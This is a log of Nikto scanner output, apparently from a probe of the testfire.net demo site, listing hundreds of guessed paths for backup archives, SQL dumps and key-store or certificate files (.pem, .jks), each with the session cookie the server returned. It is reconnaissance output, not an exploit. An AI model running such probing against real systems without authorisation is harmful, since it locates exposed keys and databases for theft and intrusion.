[NIKTO-SRV] [NIKTO] + /dump.tar.gz sent cookie: JSESSIONID=381619BB47A35F0E76372D5B7A49A34F; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /dump.tar.gz sent cookie: JSESSIONID=3E581DCB0D0B6C7D1EC752AD504120AB; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire.net.bz2 sent cookie: JSESSIONID=D74E79C2CDD0A1BFAAEFE99A1555D638; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire.net.bz2 sent cookie: JSESSIONID=556134ECAE3637196C8B7371FA91D64A; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire.net.zip sent cookie: JSESSIONID=81E76F2166307BEDAAFA82212804D20A; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire.net.zip sent cookie: JSESSIONID=E018BA5C23FCA51708F1BB94967A771D; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /backup.tar sent cookie: JSESSIONID=ADCEBE9C848F60E7488B5BE1F51B79D2; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /backup.tar sent cookie: JSESSIONID=C0F08F42BF2A548D5654E1A0BD42FA06; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /net.tgz sent cookie: JSESSIONID=BE3A251ACA58EFEFABA6D039E7A782BE; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /net.tgz sent cookie: JSESSIONID=6DDCCE161A0472D3D5E3A015B0EC6C8D; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /archive.cer sent cookie: JSESSIONID=DE72D2C57B713BD0E49E63DBCC90B700; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /archive.cer sent cookie: JSESSIONID=305A361E225EC2AA8067BAB37BEAA4EA; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /database.gz sent cookie: JSESSIONID=B2D92ACA6F6C1EAE1779181ABBF2003D; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /database.gz sent cookie: JSESSIONID=6029EE1F96139C8FF83E60DA0721511A; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire_net.tar.lzma sent cookie: JSESSIONID=6B22A3596345EE48F5F38B611E37B35A; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire_net.tar.lzma sent cookie: JSESSIONID=ECE5E63A25D6A2041637B3E300AFBCAF; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire_net.tar.bz2 sent cookie: JSESSIONID=E7135A92B0F09ED534628C7878D09B2A; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire_net.tar.bz2 sent cookie: JSESSIONID=0B5BFF675D28FF2236445CF7F535C9EE; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /net.pem sent cookie: JSESSIONID=8EFA859BAA79CDD0C33F7D01A3572B02; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /net.pem sent cookie: JSESSIONID=F140502BB0D648CE54DF81AE131B5068; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /backup.lzma sent cookie: JSESSIONID=CBEA8F176FFCF972CA33E7798658189F; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /backup.lzma sent cookie: JSESSIONID=DC635349EE7312EB268D0514D2B4EF13; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire.pem sent cookie: JSESSIONID=53F815FFCD5F5B356740A96A9E16F3E5; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire.pem sent cookie: JSESSIONID=D76A76E202DF9963A82C83AA27629467; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire.tar sent cookie: JSESSIONID=E38D98EC2D5CF5A9AB62D5089374D822; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire.tar sent cookie: JSESSIONID=C6906794D8F99767F6E21B436865F79E; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire_net.bz2 sent cookie: JSESSIONID=63B4EF66C2064083DC7B554B10AE2FCC; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire_net.bz2 sent cookie: JSESSIONID=7730326DBF3AF28C5852786A2353B614; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire.tar.gz sent cookie: JSESSIONID=97F6EDFB68C89F09072418F61B20FC2E; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire.tar.gz sent cookie: JSESSIONID=5D5390BBE829D9EC590BCFFBF485795A; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire_net.zip sent cookie: JSESSIONID=84A8D819D8FD1AC7CF80D33FFBC5BAD5; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire_net.zip sent cookie: JSESSIONID=41BBFB744EBC797ED5125F8FFB5D3AE4; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /database.tar.gz sent cookie: JSESSIONID=ACA0570B3D77B09106CA7225951BBF0C; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /database.tar.gz sent cookie: JSESSIONID=1B074A37DC632855A022DBDC0BEDEBFE; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfirenet.jks sent cookie: JSESSIONID=7ECC10C6BDA52050E7F1F9A9ED18E175; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfirenet.jks sent cookie: JSESSIONID=6481C50CEA6DFC06B4301E8E865D96E5; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /site.war sent cookie: JSESSIONID=4A713CEDBD22E6C0D341F000F9DBC889; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /site.war sent cookie: JSESSIONID=83FD04B3FFBAB13A777B510F361EEEA6; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /database.tar sent cookie: JSESSIONID=B95600ABA5DA8F7F812EF7C99AE7404E; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /database.tar sent cookie: JSESSIONID=6C53F33B9410291993E4109D3061C5E0; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /site.jks sent cookie: JSESSIONID=B9F7FF1C588BB430972A24D69824D8F3; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /site.jks sent cookie: JSESSIONID=8D799E28C66C9855025E594D82725630; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /database.pem sent cookie: JSESSIONID=C21E9CDFA642BDE332B27BA4CF02C8D0; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /database.pem sent cookie: JSESSIONID=B86669618888EC471F72EED75BA0579B; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /net.tar.bz2 sent cookie: JSESSIONID=BAE686619D8AA9FA0B793BB74EA1EBB0; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /net.tar.bz2 sent cookie: JSESSIONID=625E9B09320B2053082CC5C78E5B215C; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /site.gz sent cookie: JSESSIONID=92EC62BB305E31B81BED517904112BC3; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /site.gz sent cookie: JSESSIONID=A15E7E651AB636C2EA8EB9A4B74C56C5; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire.net.tar.bz2 sent cookie: JSESSIONID=08C0D9D261236EFB88B40D3B508E581C; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire.net.tar.bz2 sent cookie: JSESSIONID=9006C26B235ED55EFAF6794908624FF8; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire.net.tar.lzma sent cookie: JSESSIONID=0E4A540D2756221431FECECE152C20F3; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire.net.tar.lzma sent cookie: JSESSIONID=25B3340E5C2BE5DB8D456D731363ABEF; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire_net.sql sent cookie: JSESSIONID=9CC312703DB049ADC2352A8CD972FCF3; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire_net.sql sent cookie: JSESSIONID=611CC1A0217F55D209E578B5F0792E86; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /archive.tar.bz2 sent cookie: JSESSIONID=75BD429BE7DDF9703ABEE9D6C3655E74; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /archive.tar.bz2 sent cookie: JSESSIONID=6B8DB3634A11A928E8289E363D55C435; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire.cer sent cookie: JSESSIONID=54CA5E157E2621635F3B530FBA4B971E; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire.cer sent cookie: JSESSIONID=A431B836287AA8C85197951FC39F4E04; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire.net.tar sent cookie: JSESSIONID=C5A03AD59427D1D4AEDB102F8E16C7BC; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire.net.tar sent cookie: JSESSIONID=49138880AB9BF965716C5D3DE210B0B4; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /site.tar.lzma sent cookie: JSESSIONID=2B8CD0DACAFEF17EF690D61A8959BE05; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /site.tar.lzma sent cookie: JSESSIONID=5FFE223342566CAB2E509180A9D03702; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /site.sql sent cookie: JSESSIONID=6292FB6818F842F49738F9AA59B4D3DE; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /site.sql sent cookie: JSESSIONID=DFD55C362B8596EB256BE761C062BE10; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfirenet.gz sent cookie: JSESSIONID=620ECCE4317B01F1044C7A21849529BC; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfirenet.gz sent cookie: JSESSIONID=A66885920FC94695ADD52E52CDAFFAD9; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /backup.gz sent cookie: JSESSIONID=FA1C70EFE4234A166813813B91B62F43; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /backup.gz sent cookie: JSESSIONID=C4CF0C90B55585E2535A4E5380FC9009; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /65.61.137.117.pem sent cookie: JSESSIONID=9FC48CECD2DB39F1E8594EEC83E1798F; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /65.61.137.117.pem sent cookie: JSESSIONID=B344EEF231926746CB2C24132D59D6C2; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /database.cer sent cookie: JSESSIONID=FDE796D5674B623B9BB424255CE41428; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /database.cer sent cookie: JSESSIONID=ED4A7434B1BCD1921C03DB7CE791E054; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /backup.tar.gz sent cookie: JSESSIONID=23F7817C2642580B3C5BF09C7F9447C3; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /backup.tar.gz sent cookie: JSESSIONID=791AAD576285C6562A44D568C9A10A81; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire.net.sql sent cookie: JSESSIONID=6AE5B30871985A38F1B9D828E0DA761D; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire.net.sql sent cookie: JSESSIONID=1F88108D26443871EC5FC20CE858FDEC; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /net.war sent cookie: JSESSIONID=813836CF852D12876FB137D434B10DF2; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /net.war sent cookie: JSESSIONID=9B84FAC9247E13D7C8D16F21B54019AB; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire_net.tar sent cookie: JSESSIONID=9B3A3576880EC74DD2BAAE35CC213A5D; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire_net.tar sent cookie: JSESSIONID=E6F51CAAE577AC2EC12F0425E091890D; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfirenet.tar sent cookie: JSESSIONID=A6242D222D53584703B0556383DCDBCC; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfirenet.tar sent cookie: JSESSIONID=584947890AA52F94ECB431D6CF611505; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /backup.tgz sent cookie: JSESSIONID=A1DEABBE288C56EA21B6E34BF1D7DEFB; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /backup.tgz sent cookie: JSESSIONID=BCB7FDC10C33898BA21E83BA38CC397A; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /backup.zip sent cookie: JSESSIONID=DAA4E4086D8A8D5BAE72E9E2F9C1BE98; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /backup.zip sent cookie: JSESSIONID=F5C6FB92E8B82A846F3DAF7854367FE4; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /65.61.137.117.bz2 sent cookie: JSESSIONID=0E13BF0876031F4AB718838E3D29F2AC; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /65.61.137.117.bz2 sent cookie: JSESSIONID=9D7845C1B723795B7C25568637814E26; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /net.bz2 sent cookie: JSESSIONID=FADF8A168873BCD3853C7F521487E684; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /net.bz2 sent cookie: JSESSIONID=59F7456B20C7A717F9996E4B4486AEC4; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /archive.gz sent cookie: JSESSIONID=B3599BB70BF7EACC4212C1CD6C5419D0; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /archive.gz sent cookie: JSESSIONID=58288D6E443EB883DF7C84AAF77A0A0B; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfirenet.tar.lzma sent cookie: JSESSIONID=58D579EAA11C54D873B24294936AAD0E; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfirenet.tar.lzma sent cookie: JSESSIONID=C034D97DE8CFEE585921AEE92D13E4B7; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /65.61.137.117.tar.gz sent cookie: JSESSIONID=6413C935EF78A219C076328EDC59D609; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /65.61.137.117.tar.gz sent cookie: JSESSIONID=C115D97320C96AD56D3659820BFCD893; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /65.61.137.117.cer sent cookie: JSESSIONID=735C548B236D5C9D1821A20D29EDD956; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /65.61.137.117.cer sent cookie: JSESSIONID=C7A401A633604A08FC0C2C55032802A9; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /backup.tar.bz2 sent cookie: JSESSIONID=AC2F9135DD350051DE6948BBEAB67060; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /backup.tar.bz2 sent cookie: JSESSIONID=17512FFAB6876DCF32990BA47AF4CDB0; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /database.zip sent cookie: JSESSIONID=E290DEBB4EA70E88892C743FB887EB68; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /database.zip sent cookie: JSESSIONID=54BA7FC8DB30B856EDDC1E72E3D349CF; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /site.tar.bz2 sent cookie: JSESSIONID=04FDAE30BF389A39AF96AC560A980263; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /site.tar.bz2 sent cookie: JSESSIONID=81963E35500CCC7550B506BEB8EF01DE; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire_net.lzma sent cookie: JSESSIONID=E2511C7B137005E1CDEABF12C458E1CE; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire_net.lzma sent cookie: JSESSIONID=B8BFE15BC4260C259A6CD958FA81817A; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /dump.pem sent cookie: JSESSIONID=396E7EBC0BCAC23E63672BD23C100E79; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /dump.pem sent cookie: JSESSIONID=A928BE12FCC8A1479A6F1A34AB6257C0; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire.zip sent cookie: JSESSIONID=FC50B00AC76132020924B5B0BE27CB73; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire.zip sent cookie: JSESSIONID=5C5BD52E6C86D8F7FE04D9A2FD59DCAD; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /database.jks sent cookie: JSESSIONID=70D0C78FE34CF9413AD077850F725413; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /database.jks sent cookie: JSESSIONID=8C1A9CADF178A076E1B115E299B9339A; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /65.61.137.117.sql sent cookie: JSESSIONID=FB81AF41B9FFB25981C90855206E6564; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /65.61.137.117.sql sent cookie: JSESSIONID=53C804724FDC056484655F06FC15F6B3; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /archive.war sent cookie: JSESSIONID=7F3D02A63C298AD3A79B2498720D96ED; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /archive.war sent cookie: JSESSIONID=63034B8B38F6D0CE888D819546374B5E; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /65.61.137.117.egg sent cookie: JSESSIONID=0D265D0548CFCA784097768049FBFB47; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /65.61.137.117.egg sent cookie: JSESSIONID=A14032705F4E97BEF928359706AE5383; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire.net.lzma sent cookie: JSESSIONID=58F3EC3A22B4C1C604A9EBD0D29BD5ED; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire.net.lzma sent cookie: JSESSIONID=EC4E059E1642AE75DD46C8DDE16C7229; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /backup.sql sent cookie: JSESSIONID=1438BDEB14A8548E6CA3FA0A21C39E75; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /backup.sql sent cookie: JSESSIONID=CB5665DE412B065089EE5FAFAD07AAF2; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfirenet.tar.gz sent cookie: JSESSIONID=CB9070F13B83719AC249377407ABC1CC; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfirenet.tar.gz sent cookie: JSESSIONID=7EB7809903E98C8EF3DEB34AB1513604; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /archive.lzma sent cookie: JSESSIONID=279188CAAE15C57FA121A0510A624492; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /archive.lzma sent cookie: JSESSIONID=B16A48164D0286B2680531203AD89D89; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /net.sql sent cookie: JSESSIONID=BC37D650501180207F8563C81E09CFF2; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /net.sql sent cookie: JSESSIONID=77F42ED322DAC9CD8CD06215D3C2476A; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /backup.pem sent cookie: JSESSIONID=DDF490DD44A258CFAAEBCACFEBCE4AB2; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /backup.pem sent cookie: JSESSIONID=9F155693B7ACC85BBE8B82B575E678F0; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /site.tgz sent cookie: JSESSIONID=415EE80E2A0CA4936F0D2461C726FA7B; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /site.tgz sent cookie: JSESSIONID=9DB697A0687CD8A0651D5058C9A8C3DB; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire.jks sent cookie: JSESSIONID=260515FE6FE16AF2EAE060B7FA03D74E; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire.jks sent cookie: JSESSIONID=7F6C2578FD157FF731DB90D63BB7110D; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfirenet.tar.bz2 sent cookie: JSESSIONID=1454EC88ED82ECB9C3FFEFABAE419417; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfirenet.tar.bz2 sent cookie: JSESSIONID=29862783C6116137680454CE3FFC25F0; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /site.lzma sent cookie: JSESSIONID=6E50FFD0C1AB3D2DC40B30EAEC4EC833; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /site.lzma sent cookie: JSESSIONID=546B9014440438378CE68DF8EFD74436; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire.net.pem sent cookie: JSESSIONID=19B39874FFE1E577B0FF91569EE85E39; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire.net.pem sent cookie: JSESSIONID=AFDD71F1C89D3BA6784BA6DFCE18D01F; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /dump.zip sent cookie: JSESSIONID=0003095A98E13554A527C8EA316334E4; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /dump.zip sent cookie: JSESSIONID=8B67D5DA026A7D374DC45114015D7046; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfirenet.sql sent cookie: JSESSIONID=6BC93F713666EC8E48C9B627F58BA50C; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfirenet.sql sent cookie: JSESSIONID=EAA21227824A9D3F0407BF43F70C5C1C; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /net.lzma sent cookie: JSESSIONID=548AC971FD18022F89FB4C83DF9812E1; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /net.lzma sent cookie: JSESSIONID=3BB841A08949F7C6B3942F0EBB7FD135; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /archive.tar.gz sent cookie: JSESSIONID=D716373CD02E84178835102E809E4189; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /archive.tar.gz sent cookie: JSESSIONID=2471DAFEFC49BDFFE464DAE1921EE8E3; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /site.bz2 sent cookie: JSESSIONID=A1B44BBAC602DFA04D44D2599DCE3EA8; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /site.bz2 sent cookie: JSESSIONID=304D9CA5DB35DC15D4166F5A33D8EAF0; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /site.cer sent cookie: JSESSIONID=4F5D6F03E98D97A1826DA6737B7964E6; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /site.cer sent cookie: JSESSIONID=0F74C9B8384BC473C208463FA6EA1316; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /65.61.137.117.tar sent cookie: JSESSIONID=492946EF4DB10610FAE2CF50B5C2A8AD; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /65.61.137.117.tar sent cookie: JSESSIONID=9E8F9D5521E155B5A41B6237CFCB0227; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfirenet.bz2 sent cookie: JSESSIONID=F2D8E327D31A70389EA7303847ADFBB9; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfirenet.bz2 sent cookie: JSESSIONID=5710EAE7D0E05EE7B36902D31689DCE7; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /archive.sql sent cookie: JSESSIONID=8F1AFACA6701451B3A9D5C61DC22D0B5; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /archive.sql sent cookie: JSESSIONID=51542C363A8B1C1A7909670B882A2DB8; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /65.61.137.117.zip sent cookie: JSESSIONID=C288030C6A6A8D4F12E9A11CEE74A9F0; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /65.61.137.117.zip sent cookie: JSESSIONID=439735D1E53D76FAAA38504F2F176957; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /backup.war sent cookie: JSESSIONID=3BC72AAA05F67FD0974F9B3461E2846A; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /backup.war sent cookie: JSESSIONID=C9020B4010474336D70CB5BB91D6AEC2; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /dump.egg sent cookie: JSESSIONID=26749242AB84AB54894AA64B8C0B22C1; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /dump.egg sent cookie: JSESSIONID=0DA3E3B3DAF4CBFF39A7D1172F718DAD; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire_net.pem sent cookie: JSESSIONID=BFD53E5B3B731BABF400DE3C7AB248CB; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire_net.pem sent cookie: JSESSIONID=21D38841FB492F5827503B8A45DDB66C; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /dump.tar sent cookie: JSESSIONID=0A8B3A2D4F4F1D4500B265C48BBC3937; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /dump.tar sent cookie: JSESSIONID=FF1718630CF77328C9C0BB9EA65B8714; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /archive.pem sent cookie: JSESSIONID=5FADD0819464C969F51489D70FD4ECA4; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /archive.pem sent cookie: JSESSIONID=DA84CABE88893C9FE9D5930FC8035727; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire.net.cer sent cookie: JSESSIONID=B9FE894FDECFF6E685ACCBBDD53699BB; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire.net.cer sent cookie: JSESSIONID=9DBBDD82E02FE0B9C9928E4BB36B1B64; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire.net.tgz sent cookie: JSESSIONID=F13F44536531F4FDBC20850B55E9BD43; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire.net.tgz sent cookie: JSESSIONID=C37EC406F04AEBA35CFA1B6E8F371908; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire.egg sent cookie: JSESSIONID=8EE0BC2FFE26CF47C28FDF4DD4088D1B; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire.egg sent cookie: JSESSIONID=0F39C83714422BF701887416193C43EF; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /dump.tgz sent cookie: JSESSIONID=9FD72ABFE1749DE7BF0362CD1182F94D; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /dump.tgz sent cookie: JSESSIONID=81BF4A245F7E5198E80458E7B8887161; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /database.egg sent cookie: JSESSIONID=60DFB636EBF8F699F1EC793FA56A8538; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /database.egg sent cookie: JSESSIONID=A597884970FA880303065E7101FA9CC5; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /backup.jks sent cookie: JSESSIONID=B021B9958114CE9D99D831010E7520D9; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /backup.jks sent cookie: JSESSIONID=F0531B803D9C97077C153BA97CD7755C; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire.net.gz sent cookie: JSESSIONID=91CB9279D7B6A8C7B059405A56500FFE; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire.net.gz sent cookie: JSESSIONID=122953ADC212DD17F28ABCBE86CD2279; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire.sql sent cookie: JSESSIONID=25CBAB7370A84D2B307685D9243273FD; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire.sql sent cookie: JSESSIONID=353F3C516E0037EAD8B685F296CEBF8D; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /65.61.137.117.war sent cookie: JSESSIONID=8A6CC0CED53B426494C0C0AF4F559039; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /65.61.137.117.war sent cookie: JSESSIONID=EE7AF2F8852F2376E25105B47ED05EDD; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /site.pem sent cookie: JSESSIONID=FDE1C80F62ED38C29DCDFDBCE405A065; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /site.pem sent cookie: JSESSIONID=11BC3C1C64F4B6B233BB4EE69B718228; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire_net.cer sent cookie: JSESSIONID=97FF22B135DB33FEC03179E818503622; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire_net.cer sent cookie: JSESSIONID=FCB44B203742151866F3208361947139; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /database.tar.bz2 sent cookie: JSESSIONID=134388B7006BD888083DE7DF3B5F7717; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /database.tar.bz2 sent cookie: JSESSIONID=E5F3DE7A4F63BFA40474226C7E5DF137; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire_net.tgz sent cookie: JSESSIONID=294E5BAEA4325A8E7EC903C372AAB4B2; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire_net.tgz sent cookie: JSESSIONID=3B269CC0BC6D36D02AF07324E84BB552; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /archive.egg sent cookie: JSESSIONID=8723528E448068FF2C635DA7744936D3; Path=/; HttpOnly
